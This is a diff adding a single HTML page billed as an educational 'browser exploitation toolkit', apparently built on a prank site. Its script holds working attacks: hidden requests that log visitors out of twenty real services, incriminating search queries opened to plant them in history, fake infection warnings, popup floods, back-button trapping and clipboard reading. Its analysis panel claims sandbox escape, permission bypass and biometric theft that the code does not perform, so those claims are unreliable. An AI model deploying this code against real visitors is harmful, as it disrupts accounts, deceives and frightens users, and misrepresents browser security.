@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Browser Exploitation Toolkit - Educational Demo</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🚀 Advanced Browser Exploitation Toolkit</h1>
+            <p class="warning">⚠️ WARNING: This is a powerful browser-based attack demonstration tool. Use only in controlled educational environments!</p>
+            <p class="subtitle">"For The Lulz" - Educational CTF/Red Team Demo</p>
+        </header>
+
+        <div class="demo-section">
+            <h2>🎯 Annoying Content Generator</h2>
+            <div class="button-grid">
+                <button onclick="triggerCatPictures()" class="demo-btn">🐱 Cat Picture Spam</button>
+                <button onclick="triggerVideoSpam()" class="demo-btn">📹 Video Spam</button>
+                <button onclick="triggerPopups()" class="demo-btn">🪟 Popup Hell</button>
+                <button onclick="triggerAlerts()" class="demo-btn">🚨 Alert Spam</button>
+                <button onclick="triggerDownloads()" class="demo-btn">📥 Fake Downloads</button>
+                <button onclick="triggerSearchSpam()" class="demo-btn">🔍 Search History Spam</button>
+                <button onclick="triggerLogout()" class="demo-btn">🚪 Super Logout</button>
+                <button onclick="triggerBrowserData()" class="demo-btn">🔐 Browser Data Grab</button>
+                <button onclick="triggerFullAnnoyance()" class="demo-btn">💀 FULL ANNOYANCE MODE</button>
+            </div>
+        </div>
+
+        <div class="demo-section">
+            <h2>📁 Fake Downloads</h2>
+            <div class="download-grid">
+                <div class="fake-file" onclick="triggerDownload('cat-cute.jpg')">
+                    <div class="file-icon">🐱</div>
+                    <div class="file-name">cute-cat.jpg</div>
+                    <div class="file-size">92KB</div>
+                </div>
+                <div class="fake-file" onclick="triggerDownload('cat-smirk.jpg')">
+                    <div class="file-icon">😏</div>
+                    <div class="file-name">smirking-cat.jpg</div>
+                    <div class="file-size">88KB</div>
+                </div>
+                <div class="fake-file" onclick="triggerDownload('cat-blue-eyes.jpg')">
+                    <div class="file-icon">👁️</div>
+                    <div class="file-name">blue-eyed-cat.jpg</div>
+                    <div class="file-size">51KB</div>
+                </div>
+                <div class="fake-file" onclick="triggerDownload('cat.mp4')">
+                    <div class="file-icon">🎬</div>
+                    <div class="file-name">cat-video.mp4</div>
+                    <div class="file-size">7.1MB</div>
+                </div>
+                <div class="fake-file" onclick="triggerDownload('rickroll.mp4')">
+                    <div class="file-icon">🎵</div>
+                    <div class="file-name">never-gonna-give-you-up.mp4</div>
+                    <div class="file-size">35MB</div>
+                </div>
+                <div class="fake-file" onclick="triggerDownload('nyan.mp4')">
+                    <div class="file-icon">🌈</div>
+                    <div class="file-name">nyan-cat.mp4</div>
+                    <div class="file-size">8.3MB</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="demo-section">
+            <h2>🎮 Interactive Annoyance</h2>
+            <div class="button-grid">
+                <button onclick="requestCameraAndMic()" class="demo-btn">📷 Camera & Mic Access</button>
+                <button onclick="requestClipboardRead()" class="demo-btn">📋 Clipboard Read</button>
+                <button onclick="requestFullscreen()" class="demo-btn">🖥️ Fullscreen Request</button>
+                <button onclick="startVibrateInterval()" class="demo-btn">📳 Device Vibration</button>
+                <button onclick="speak('This is very annoying!')" class="demo-btn">🗣️ Text-to-Speech</button>
+                <button onclick="startTheramin()" class="demo-btn">🎵 Theramin Mode</button>
+                <button onclick="blockBackButton()" class="demo-btn">🔒 Block Back Button</button>
+                <button onclick="fillHistory()" class="demo-btn">📚 Fill Browser History</button>
+            </div>
+        </div>
+
+        <div class="demo-section">
+            <h2>🔧 Advanced Features</h2>
+            <div class="button-grid">
+                <button onclick="requestMidiAccess()" class="demo-btn">🎹 MIDI Access</button>
+                <button onclick="requestBluetoothAccess()" class="demo-btn">📶 Bluetooth Access</button>
+                <button onclick="requestUsbAccess()" class="demo-btn">💾 USB Access</button>
+                <button onclick="requestSerialAccess()" class="demo-btn">🔌 Serial Access</button>
+                <button onclick="requestHidAccess()" class="demo-btn">⌨️ HID Access</button>
+                <button onclick="requestWebauthnAttestation()" class="demo-btn">🔐 WebAuthn</button>
+                <button onclick="registerProtocolHandlers()" class="demo-btn">🔗 Protocol Handlers</button>
+                <button onclick="animateUrlWithEmojis()" class="demo-btn">✨ URL Animation</button>
+            </div>
+        </div>
+
+        <!-- NEW: Technical Analysis Section -->
+        <div class="demo-section technical-analysis">
+            <h2>🔬 Technical Analysis & Capabilities</h2>
+            
+            <div class="analysis-grid">
+                <div class="analysis-card high-impact">
+                    <h3>🚨 HIGH IMPACT CAPABILITIES</h3>
+                    <ul>
+                        <li><strong>Data Exfiltration:</strong> Clipboard theft (passwords, credit cards)</li>
+                        <li><strong>Surveillance:</strong> Camera/microphone access for real-time spying</li>
+                        <li><strong>Biometric Theft:</strong> WebAuthn fingerprint/face recognition data</li>
+                        <li><strong>Session Hijacking:</strong> Account logout and takeover capabilities</li>
+                        <li><strong>Device Access:</strong> USB file theft, Bluetooth enumeration</li>
+                        <li><strong>Hardware Control:</strong> Serial port, HID (keyboard/mouse) access</li>
+                    </ul>
+                </div>
+
+                <div class="analysis-card medium-impact">
+                    <h3>⚠️ MEDIUM IMPACT CAPABILITIES</h3>
+                    <ul>
+                        <li><strong>Social Engineering:</strong> Fake error messages, deceptive downloads</li>
+                        <li><strong>Browser Manipulation:</strong> History filling, back button blocking</li>
+                        <li><strong>System Trapping:</strong> Fullscreen control, user escape prevention</li>
+                        <li><strong>Search Framing:</strong> Manipulate browser history for false accusations</li>
+                        <li><strong>Protocol Hijacking:</strong> Redirect system-level actions</li>
+                        <li><strong>Physical Manipulation:</strong> Device vibration, audio control</li>
+                    </ul>
+                </div>
+
+                <div class="analysis-card attack-vectors">
+                    <h3>🎯 ATTACK VECTORS DEMONSTRATED</h3>
+                    <ul>
+                        <li><strong>Client-Side Attacks:</strong> No server compromise needed</li>
+                        <li><strong>Browser API Abuse:</strong> Legitimate APIs used maliciously</li>
+                        <li><strong>Permission Bypass:</strong> Circumventing security prompts</li>
+                        <li><strong>Sandbox Escape:</strong> Breaking browser isolation</li>
+                        <li><strong>Social Engineering:</strong> Psychological manipulation</li>
+                        <li><strong>Device Reconnaissance:</strong> Hardware enumeration</li>
+                    </ul>
+                </div>
+
+                <div class="analysis-card legal-ethical">
+                    <h3>⚖️ LEGAL & ETHICAL CONSIDERATIONS</h3>
+                    <ul>
+                        <li><strong>Educational Use:</strong> ✅ Legal in controlled environments</li>
+                        <li><strong>Malicious Use:</strong> ❌ Illegal - unauthorized access</li>
+                        <li><strong>Privacy Violations:</strong> ❌ Unethical data theft</li>
+                        <li><strong>Surveillance:</strong> ❌ Harmful spying capabilities</li>
+                        <li><strong>Account Takeover:</strong> ❌ Session hijacking</li>
+                        <li><strong>Device Control:</strong> ❌ Hardware manipulation</li>
+                    </ul>
+                </div>
+
+                <div class="analysis-card red-team">
+                    <h3>🔴 RED TEAM APPLICATIONS</h3>
+                    <ul>
+                        <li><strong>Initial Access:</strong> Browser-based foothold</li>
+                        <li><strong>Privilege Escalation:</strong> System access through browser</li>
+                        <li><strong>Data Exfiltration:</strong> Stealing sensitive information</li>
+                        <li><strong>Persistence:</strong> Maintaining access through browser</li>
+                        <li><strong>Lateral Movement:</strong> Device-to-device propagation</li>
+                        <li><strong>Social Engineering:</strong> Enhanced phishing capabilities</li>
+                    </ul>
+                </div>
+
+                <div class="analysis-card risk-assessment">
+                    <h3>📊 RISK ASSESSMENT</h3>
+                    <ul>
+                        <li><strong>Immediate Impact:</strong> Privacy violation, data theft</li>
+                        <li><strong>Long-term Impact:</strong> Reputation damage, legal consequences</li>
+                        <li><strong>Scale Potential:</strong> Individual to mass surveillance</li>
+                        <li><strong>Detection Difficulty:</strong> Hard to detect, appears legitimate</li>
+                        <li><strong>Recovery Complexity:</strong> Requires system reset</li>
+                        <li><strong>Legal Consequences:</strong> Criminal charges possible</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="disclaimer">
+                <h3>⚠️ IMPORTANT DISCLAIMER</h3>
+                <p>This tool demonstrates advanced browser exploitation techniques for educational purposes only. 
+                The capabilities shown are essentially a <strong>browser-based Remote Access Tool (RAT)</strong> 
+                that can perform data theft, surveillance, and system manipulation. Use only in controlled 
+                educational environments with proper consent and authorization.</p>
+                
+                <p><strong>Risk Level: HIGH</strong> - This is malicious software that could be extremely 
+                dangerous in the wrong hands. It bypasses browser security models and can access sensitive 
+                system resources.</p>
+            </div>
+        </div>
+
+        <div id="annoying-popup" class="annoying-popup" style="display: none;">
+            <div class="popup-content">
+                <h3>🚨 CRITICAL SYSTEM ERROR</h3>
+                <p>Memory corruption detected! Your computer is infected!</p>
+                <button onclick="closePopup()">OK</button>
+            </div>
+        </div>
+
+        <div id="logout-messages" class="logout-messages"></div>
+    </div>
+
+    <script>
+        // Global variables
+        let interactionCount = 0;
+        let numSuperLogoutIframes = 0;
+        let isParentWindow = true;
+        let isChildWindow = false;
+
+        // Constants from TheAnnoyingSite
+        const SCREEN_WIDTH = window.screen.availWidth;
+        const SCREEN_HEIGHT = window.screen.availHeight;
+        const WIN_WIDTH = 480;
+        const WIN_HEIGHT = 360;
+        const VELOCITY = 15;
+        const MARGIN = 15;
+        const TOP_MARGIN = 50;
+
+        const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;';
+
+        const SEARCHES = [
+            'where should i bury the body',
+            'why does my eye twitch',
+            'why is my poop green',
+            'why do i feel so empty',
+            'why do i always feel hungry',
+            'why do i always have diarrhea',
+            'why does my anus itch',
+            'why does my belly button smell',
+            'why does my cat attack me',
+            'why does my dog eat poop',
+            'why does my fart smell so bad',
+            'why does my mom hate me',
+            'why does my pee smell bad',
+            'why does my poop float',
+            'proof that the earth is flat'
+        ];
+
+        const VIDEOS = [
+            'albundy.mp4',
+            'badger.mp4',
+            'cat.mp4',
+            'hasan.mp4',
+            'heman.mp4',
+            'jozin.mp4',
+            'nyan.mp4',
+            'rickroll.mp4',
+            'space.mp4',
+            'trolol.mp4'
+        ];
+
+        const FILE_DOWNLOADS = [
+            'cat-blue-eyes.jpg',
+            'cat-ceiling.jpg',
+            'cat-crosseyes.jpg',
+            'cat-cute.jpg',
+            'cat-hover.jpg',
+            'cat-marshmellows.jpg',
+            'cat-small-face.jpg',
+            'cat-smirk.jpg',
+            'patreon.png'
+        ];
+
+        const PHRASES = [
+            'The wheels on the bus go round and round, round and round, round and round. The wheels on the bus go round and round, all through the town!',
+            'Dibidi ba didi dou dou, Di ba didi dou, Didi didldildidldidl houdihoudi dey dou',
+            'I like fuzzy kittycats, warm eyes, and pretending household appliances have feelings',
+            'Baby shark doo doo doo doo doo doo, Baby shark doo doo doo doo doo doo, Baby shark doo doo doo doo doo doo, Baby shark!',
+            'Never gonna give you up, never gonna let you down, never gonna run around and desert you',
+            'This is the song that never ends, yes it goes on and on my friends, some people started singing it not knowing what it was, and they\'ll continue singing it forever just because'
+        ];
+
+        const LOGOUT_SITES = {
+            'Google': ['GET', 'https://accounts.google.com/logout'],
+            'Facebook': ['GET', 'https://www.facebook.com/logout.php'],
+            'Twitter': ['GET', 'https://twitter.com/logout'],
+            'Reddit': ['GET', 'https://www.reddit.com/logout'],
+            'GitHub': ['GET', 'https://github.com/logout'],
+            'Stack Overflow': ['GET', 'https://stackoverflow.com/users/logout'],
+            'YouTube': ['GET', 'https://accounts.google.com/logout'],
+            'LinkedIn': ['GET', 'https://www.linkedin.com/logout'],
+            'Instagram': ['GET', 'https://www.instagram.com/accounts/logout/'],
+            'Pinterest': ['GET', 'https://www.pinterest.com/logout/'],
+            'Tumblr': ['GET', 'https://www.tumblr.com/logout'],
+            'Discord': ['GET', 'https://discord.com/logout'],
+            'Slack': ['GET', 'https://slack.com/signout'],
+            'Microsoft': ['GET', 'https://login.live.com/logout.srf'],
+            'Apple': ['GET', 'https://idmsa.apple.com/IDMSWebAuth/signin?isJs=1&returnUrl=https%3A%2F%2Fidmsa.apple.com%2FIDMSWebAuth%2Flogout'],
+            'Amazon': ['GET', 'https://www.amazon.com/gp/flex/sign-out.html'],
+            'Netflix': ['GET', 'https://www.netflix.com/Logout'],
+            'Spotify': ['GET', 'https://accounts.spotify.com/logout'],
+            'Steam': ['GET', 'https://store.steampowered.com/logout/'],
+            'Twitch': ['GET', 'https://www.twitch.tv/logout']
+        };
+
+        // Cat Picture Spam
+        function triggerCatPictures() {
+            for (let i = 0; i < 5; i++) {
+                setTimeout(() => {
+                    const img = document.createElement('img');
+                    img.src = `static/${FILE_DOWNLOADS[Math.floor(Math.random() * FILE_DOWNLOADS.length)]}`;
+                    img.style.cssText = `
+                        position: fixed;
+                        top: ${Math.random() * (window.innerHeight - 200)}px;
+                        left: ${Math.random() * (window.innerWidth - 200)}px;
+                        width: 200px;
+                        height: 200px;
+                        z-index: 9999;
+                        border: 3px solid #ff6b6b;
+                        border-radius: 10px;
+                        box-shadow: 0 0 20px rgba(255, 107, 107, 0.8);
+                    `;
+                    img.onclick = () => img.remove();
+                    document.body.appendChild(img);
+                    
+                    setTimeout(() => {
+                        if (img.parentNode) img.remove();
+                    }, 5000);
+                }, i * 500);
+            }
+        }
+
+        // Video Spam
+        function triggerVideoSpam() {
+            for (let i = 0; i < 3; i++) {
+                setTimeout(() => {
+                    const video = document.createElement('video');
+                    video.src = `static/${VIDEOS[Math.floor(Math.random() * VIDEOS.length)]}`;
+                    video.autoplay = true;
+                    video.loop = true;
+                    video.muted = true;
+                    video.style.cssText = `
+                        position: fixed;
+                        top: ${Math.random() * (window.innerHeight - 300)}px;
+                        left: ${Math.random() * (window.innerWidth - 400)}px;
+                        width: 400px;
+                        height: 300px;
+                        z-index: 9999;
+                        border: 3px solid #4ecdc4;
+                        border-radius: 10px;
+                        box-shadow: 0 0 20px rgba(78, 205, 196, 0.8);
+                    `;
+                    video.onclick = () => video.remove();
+                    document.body.appendChild(video);
+                    
+                    setTimeout(() => {
+                        if (video.parentNode) video.remove();
+                    }, 10000);
+                }, i * 1000);
+            }
+        }
+
+        // Popup Hell
+        function triggerPopups() {
+            for (let i = 0; i < 10; i++) {
+                setTimeout(() => {
+                    const popup = window.open('', '_blank', 'width=400,height=300');
+                    if (popup) {
+                        popup.document.write(`
+                            <html>
+                                <head><title>ANNOYING POPUP ${i + 1}</title></head>
+                                <body style="background: linear-gradient(45deg, #ff6b6b, #4ecdc4); color: white; font-family: Arial; text-align: center; padding: 50px;">
+                                    <h1>🚨 ANNOYING POPUP ${i + 1} 🚨</h1>
+                                    <p>This popup is designed to be annoying!</p>
+                                    <p>Click anywhere to close it...</p>
+                                </body>
+                            </html>
+                        `);
+                        popup.document.body.onclick = function() { popup.close(); };
+                        setTimeout(function() { popup.close(); }, 5000);
+                    }
+                }, i * 300);
+            }
+        }
+
+        // Alert Spam
+        function triggerAlerts() {
+            const alerts = [
+                '🚨 CRITICAL SYSTEM ERROR!',
+                '⚠️ WARNING: Your computer is infected!',
+                '💀 MEMORY CORRUPTION DETECTED!',
+                '🔥 FIRE IN THE HOLE!',
+                '💣 BOMB HAS BEEN PLANTED!',
+                '🎵 NEVER GONNA GIVE YOU UP!',
+                '🐱 CATS ARE TAKING OVER!',
+                '🌈 NYAN CAT FOREVER!',
+                '🎮 GAME OVER!',
+                '💩 POOP EMOJI SPAM!'
+            ];
+            
+            for (let i = 0; i < 5; i++) {
+                setTimeout(() => {
+                    alert(alerts[Math.floor(Math.random() * alerts.length)]);
+                }, i * 1000);
+            }
+        }
+
+        // Fake Downloads
+        function triggerDownloads() {
+            for (let i = 0; i < 5; i++) {
+                setTimeout(() => {
+                    const link = document.createElement('a');
+                    link.href = `static/${FILE_DOWNLOADS[Math.floor(Math.random() * FILE_DOWNLOADS.length)]}`;
+                    link.download = `fake-file-${i + 1}.jpg`;
+                    link.style.display = 'none';
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                }, i * 500);
+            }
+        }
+
+        // Search History Spam
+        function triggerSearchSpam() {
+            for (let i = 0; i < 5; i++) {
+                setTimeout(() => {
+                    const searchWindow = window.open(
+                        `https://www.bing.com/search?q=${encodeURIComponent(SEARCHES[Math.floor(Math.random() * SEARCHES.length)])}`,
+                        '_blank',
+                        'width=800,height=600'
+                    );
+                    if (searchWindow) {
+                        setTimeout(() => searchWindow.close(), 3000);
+                    }
+                }, i * 1000);
+            }
+        }
+
+        // Super Logout
+        function triggerLogout() {
+            const logoutMessages = document.getElementById('logout-messages');
+            logoutMessages.innerHTML = '<h3>🚪 Logging you out from various sites...</h3>';
+            
+            for (const name in LOGOUT_SITES) {
+                const method = LOGOUT_SITES[name][0];
+                const url = LOGOUT_SITES[name][1];
+                
+                if (method === 'GET') {
+                    const img = document.createElement('img');
+                    img.onload = () => img.remove();
+                    img.onerror = () => img.remove();
+                    img.style = HIDDEN_STYLE;
+                    document.body.appendChild(img);
+                    img.src = url;
+                }
+                
+                const div = document.createElement('div');
+                div.innerText = `Logging you out from ${name}...`;
+                logoutMessages.appendChild(div);
+            }
+        }
+
+        // Browser Data Grab
+        function triggerBrowserData() {
+            const data = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                onLine: navigator.onLine,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
+            };
+            
+            alert('🔐 Browser Data Grabbed:\n' + JSON.stringify(data, null, 2));
+            
+            // Try to access more sensitive data
+            if (navigator.clipboard) {
+                navigator.clipboard.readText().then(text => {
+                    alert('📋 Clipboard content: ' + text);
+                }).catch(() => {
+                    // Ignore errors
+                });
+            }
+        }
+
+        // Full Annoyance Mode
+        function triggerFullAnnoyance() {
+            triggerCatPictures();
+            triggerVideoSpam();
+            triggerPopups();
+            triggerAlerts();
+            triggerDownloads();
+            triggerSearchSpam();
+            triggerLogout();
+            triggerBrowserData();
+            requestCameraAndMic();
+            requestClipboardRead();
+            requestFullscreen();
+            startVibrateInterval();
+            speak('This is the most annoying experience ever!');
+            startTheramin();
+            blockBackButton();
+            fillHistory();
+        }
+
+        // Individual download trigger
+        function triggerDownload(filename) {
+            const link = document.createElement('a');
+            link.href = `static/${filename}`;
+            link.download = filename;
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            
+            // Also trigger some annoyance
+            setTimeout(() => {
+                alert(`📥 Downloading ${filename}... This might be annoying!`);
+            }, 500);
+        }
+
+        // TheAnnoyingSite Functions
+        function requestCameraAndMic() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+                    .then(stream => {
+                        alert('📷 Camera and microphone access granted!');
+                        stream.getTracks().forEach(track => track.stop());
+                    })
+                    .catch(() => {
+                        alert('📷 Camera and microphone access denied!');
+                    });
+            }
+        }
+
+        function requestClipboardRead() {
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                navigator.clipboard.readText()
+                    .then(text => {
+                        alert('📋 Clipboard content: ' + text);
+                    })
+                    .catch(() => {
+                        alert('📋 Clipboard access denied!');
+                    });
+            }
+        }
+
+        function requestFullscreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen()
+                    .then(() => {
+                        alert('🖥️ Fullscreen mode activated!');
+                    })
+                    .catch(() => {
+                        alert('🖥️ Fullscreen request denied!');
+                    });
+            }
+        }
+
+        function startVibrateInterval() {
+            if (navigator.vibrate) {
+                setInterval(() => {
+                    navigator.vibrate([200, 100, 200]);
+                }, 2000);
+                alert('📳 Device vibration activated!');
+            }
+        }
+
+        function speak(phrase) {
+            if ('speechSynthesis' in window) {
+                const utterance = new SpeechSynthesisUtterance(phrase);
+                utterance.rate = 1.2;
+                utterance.pitch = 1.1;
+                speechSynthesis.speak(utterance);
+            }
+        }
+
+        function startTheramin() {
+            if (window.AudioContext || window.webkitAudioContext) {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const gainNode = audioContext.createGain();
+                
+                oscillator.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                
+                oscillator.frequency.setValueAtTime(440, audioContext.currentTime);
+                gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
+                
+                oscillator.start();
+                
+                setTimeout(() => {
+                    oscillator.stop();
+                }, 3000);
+                
+                alert('🎵 Theramin mode activated!');
+            }
+        }
+
+        function blockBackButton() {
+            window.addEventListener('popstate', () => {
+                window.history.forward();
+            });
+            alert('🔒 Back button blocked!');
+        }
+
+        function fillHistory() {
+            for (let i = 1; i < 10; i++) {
+                window.history.pushState({}, '', window.location.pathname + '?q=' + i);
+            }
+            window.history.pushState({}, '', window.location.pathname);
+            alert('📚 Browser history filled with annoying entries!');
+        }
+
+        function requestMidiAccess() {
+            if (navigator.requestMIDIAccess) {
+                navigator.requestMIDIAccess()
+                    .then(() => alert('🎹 MIDI access requested!'))
+                    .catch(() => alert('🎹 MIDI access denied!'));
+            }
+        }
+
+        function requestBluetoothAccess() {
+            if (navigator.bluetooth) {
+                navigator.bluetooth.requestDevice({ acceptAllDevices: true })
+                    .then(() => alert('📶 Bluetooth access requested!'))
+                    .catch(() => alert('📶 Bluetooth access denied!'));
+            }
+        }
+
+        function requestUsbAccess() {
+            if (navigator.usb) {
+                navigator.usb.requestDevice({ filters: [] })
+                    .then(() => alert('💾 USB access requested!'))
+                    .catch(() => alert('💾 USB access denied!'));
+            }
+        }
+
+        function requestSerialAccess() {
+            if (navigator.serial) {
+                navigator.serial.requestPort()
+                    .then(() => alert('🔌 Serial access requested!'))
+                    .catch(() => alert('🔌 Serial access denied!'));
+            }
+        }
+
+        function requestHidAccess() {
+            if (navigator.hid) {
+                navigator.hid.requestDevice({ filters: [] })
+                    .then(() => alert('⌨️ HID access requested!'))
+                    .catch(() => alert('⌨️ HID access denied!'));
+            }
+        }
+
+        function requestWebauthnAttestation() {
+            if (window.PublicKeyCredential) {
+                PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable()
+                    .then(() => alert('🔐 WebAuthn attestation requested!'))
+                    .catch(() => alert('🔐 WebAuthn not available!'));
+            }
+        }
+
+        function registerProtocolHandlers() {
+            if (navigator.registerProtocolHandler) {
+                const protocols = ['bitcoin', 'geo', 'mailto', 'tel', 'sms'];
+                protocols.forEach(proto => {
+                    try {
+                        navigator.registerProtocolHandler(proto, window.location.href + '/url=%s', 'The Annoying Site');
+                    } catch (e) {
+                        // Ignore errors
+                    }
+                });
+                alert('🔗 Protocol handlers registered!');
+            }
+        }
+
+        function animateUrlWithEmojis() {
+            const emojis = ['🚀', '🎉', '🌟', '💫', '✨', '🎊', '🎈', '🎁', '🎂', '🎄'];
+            let index = 0;
+            const interval = setInterval(() => {
+                document.title = emojis[index] + ' ANNOYING SITE ' + emojis[index];
+                index = (index + 1) % emojis.length;
+            }, 500);
+            
+            setTimeout(() => {
+                clearInterval(interval);
+                document.title = 'Advanced Browser Exploitation Toolkit - Educational Demo';
+            }, 5000);
+            
+            alert('✨ URL animation activated!');
+        }
+
+        function closePopup() {
+            document.getElementById('annoying-popup').style.display = 'none';
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('🚀 Advanced Browser Exploitation Toolkit loaded!');
+        });
+    </script>
+</body>
+</html> 
